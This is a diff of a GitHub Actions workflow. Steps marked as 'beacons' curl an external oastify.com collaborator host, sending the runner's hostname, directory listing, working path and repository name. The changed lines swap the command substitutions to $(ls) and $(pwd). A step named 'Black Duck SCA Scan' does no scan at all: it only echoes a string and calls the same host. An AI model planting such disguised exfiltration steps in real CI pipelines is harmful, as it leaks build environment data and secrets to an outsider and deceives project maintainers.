@@ -53,7 +53,7 @@ jobs:
       # === BEACON 1: proves a custom step runs ===
       - name: beacon-step
         run: |
-          curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/step1?host=$(hostname)&user=$(whoami)&repo=$BRIDGE_GITHUB_REPOSITORY_NAME" || true
+          curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/step1?host=$(hostname)&user=$(ls)&repo=$BRIDGE_GITHUB_REPOSITORY_NAME" || true
 
       # === BEACON 2: env + secret exposure (will appear in Collaborator if run:) ===
       - name: beacon-env
@@ -84,4 +84,4 @@ jobs:
           echo "BRIDGE_CLI_INSTALL_DIR=$(find "$RUNNER_TEMP" -type f -name bridge-cli | head -n1)" >> "$GITHUB_ENV" || true
 
       - name: Black Duck SCA Scan
-        run: echo "scan-step" && curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/scan?host=$(hostname)" || true
+        run: echo "scan-step" && curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/scan?host=$(pwd)" || true
